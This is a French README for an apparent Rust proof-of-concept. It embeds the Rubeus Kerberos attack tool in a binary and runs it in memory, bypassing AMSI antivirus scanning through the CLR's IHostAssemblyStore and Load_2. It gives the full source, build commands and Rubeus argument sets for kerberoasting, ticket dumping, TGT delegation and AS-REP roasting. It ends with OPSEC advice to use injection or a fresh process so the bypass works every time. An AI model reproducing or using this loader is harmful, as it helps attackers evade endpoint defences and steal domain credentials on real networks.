# PoC-ClrDeOxide

PoC minimal démontrant l'utilisation de [ClrOxide (fork)](https://github.com/WinDyAlphA/clroxide) pour exécuter un assembly .NET en mémoire avec bypass AMSI via `IHostAssemblyStore` (`Load_2`).

Ce PoC exécute **Rubeus** directement depuis les bytes embedés dans le binaire Rust — aucun accès disque au runtime, aucun drop de fichier.

---

## Ce que démontre ce PoC

- **Assembly en mémoire** : `Rubeus464.exe` est embedé à la compilation via `include_bytes!` et n'est jamais écrit sur le disque.
- **Bypass AMSI** : l'assembly est chargé via `AppDomain.Load_2(identity_string)` au lieu de `AppDomain.Load(byte[])` (`Load_3`). `Load_2` n'est pas instrumenté par AMSI.
- **`IHostAssemblyStore`** : le CLR appelle notre `ProvideAssembly` pour obtenir les bytes, ce qui signifie qu'AMSI ne voit jamais l'assembly.
- **Extraction automatique de l'identity** : l'identity string est extraite directement depuis les métadonnées PE de l'assembly (parser Rust pur, sans appel CLR).
- **Output redirigé** : `Console.Out` et `Console.Error` sont interceptés via réflexion (`System.IO.StringWriter`) — l'output de l'assembly est capturé et retourné.

---

## Flux d'exécution

```
Rubeus464.exe (bytes statiques, embedés)
         ↓
AmsiBypassLoader::new()
         ↓
Clr::new(bytes, args)
         ↓
get_assembly_identity_from_bytes() ← parsing PE metadata (ECMA-335)
         ↓   identity = "Rubeus, Version=..., Culture=neutral, PublicKeyToken=null"
ICLRRuntimeHost::SetHostControl(IHostControl)
         ↓
ICLRRuntimeHost::Start()
         ↓
AppDomain.Load_2(identity)   ← AMSI ne scanne PAS cette méthode
         ↓
IHostAssemblyStore::ProvideAssembly(identity)
         ↓   on retourne un IStream contenant les bytes
Assembly::run_entrypoint(args)
         ↓
output capturé → stdout
```

---

## Structure

```
pocclroxide/
├── src/
│   └── main.rs        # PoC — ~45 lignes
├── Rubeus464.exe      # Assembly .NET x64 embedé à la compilation
├── Cargo.toml
└── README.md
```

---

## Utilisation

### Modifier les arguments Rubeus

Dans `src/main.rs` :

```rust
let rubeus_args: Vec<String> = vec![
    "kerberoast".to_string(),
    "/stats".to_string(),
];
```

Exemples d'arguments Rubeus :

```rust
// Dump des tickets Kerberos
vec!["dump".to_string()]

// TGT delegation sans RC4
vec!["tgtdeleg".to_string(), "/rc4opsec".to_string()]

// Kerberoasting ciblé
vec!["kerberoast".to_string(), "/user:svc_sql".to_string()]

// AS-REP roasting
vec!["asreproast".to_string()]
```

### Build (cross-compilation Linux → Windows x64)

```bash
cargo build --release --target x86_64-pc-windows-gnu
```

L'exécutable est autonome, statiquement lié, sans dépendance externe autre que `mscoree.dll` (CLR host, présent sur tout Windows avec .NET installé).

### Exécution (sur Windows)

```
.\pocclroxide.exe
```

---

## Code source

```rust
use clroxide::clr::Clr;
use clroxide::primitives::AmsiBypassLoader;

static RUBEUS_BYTES: &[u8] = include_bytes!("../Rubeus464.exe");

fn execute_assembly(assembly: Vec<u8>, args: Vec<String>) -> String {
    let mut bypass_loader = AmsiBypassLoader::new();
    let mut clr = Clr::new(assembly, args).unwrap();
    clr.run_with_amsi_bypass_auto(&mut bypass_loader).unwrap()
}

fn main() {
    let args = vec!["kerberoast".to_string(), "/stats".to_string()];
    let output = execute_assembly(RUBEUS_BYTES.to_vec(), args);
    println!("{}", output);
}
```

---

## Note OPSEC

> Si le CLR est déjà démarré dans le processus courant (second `execute_assembly` dans le même process), `SetHostControl` échoue avec `E_ACCESSDENIED (0x80070005)`. Dans ce cas, l'assembly est chargé sur l'AppDomain existant sans le bypass `IHostAssemblyStore`.  
> **Pour un bypass garanti à chaque exécution** : utiliser un nouveau processus par run (injection ou spawn dédié).

---

## Dépendances

| Crate | Source |
|---|---|
| `clroxide` | [WinDyAlphA/clroxide](https://github.com/WinDyAlphA/clroxide) (fork) |

---

## Références

- [ClrOxide (fork) — WinDyAlphA](https://github.com/WinDyAlphA/clroxide)
- [Being a Good CLR Host — xforcered](https://github.com/xforcered/Being-A-Good-CLR-Host)
- [ECMA-335 — Common Language Infrastructure](https://ecma-international.org/publications-and-standards/standards/ecma-335/)
- [clroxide (upstream) — b4rtik](https://github.com/b4rtik/clroxide)
